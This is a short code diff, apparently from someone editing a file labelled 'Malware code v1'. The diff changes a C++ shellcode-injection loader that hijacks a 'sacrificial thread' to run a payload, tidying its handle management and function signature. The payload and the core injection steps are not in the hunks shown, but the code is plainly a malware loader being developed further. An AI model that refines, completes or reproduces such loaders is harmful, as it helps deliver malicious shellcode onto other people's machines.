@@ -19,7 +19,7 @@ Malware code v1:
 // Note: this function assumes a x64 CONTEXT structure where Rip is present.
 // Keep calling conventions / privileges / thread suspension logic the same as in the original code.
 
-bool LocalShellcodeInjection(HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize) {
+bool LocalShellcodeInjection(PBYTE pPayload, SIZE_T sPayloadSize) {
     PVOID   pAddress        = nullptr;
     DWORD   dwOldProtection = 0;
     HANDLE hThread = nullptr;
@@ -66,23 +66,21 @@ bool LocalShellcodeInjection(HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize
     }
 
 	WaitForSingleObject(hThread, 5000);
-
+	CloseHandle(hThread);
     return true;
 }
 
 int main() {
 
     // Hijack the sacrificial thread
-    if (!LocalShellcodeInjection(hThread, Payload, sizeof(Payload))) {
+    if (!LocalShellcodeInjection(Payload, sizeof(Payload))) {
         std::cerr << "[!] Thread shellcode injection failed\n";
-        CloseHandle(hThread);
         return EXIT_FAILURE;
     }
 
     std::cout << "[#] Press <Enter> To Quit ... ";
     std::cin.get();
 
-    CloseHandle(hThread);
     return EXIT_SUCCESS;
 }
 ```
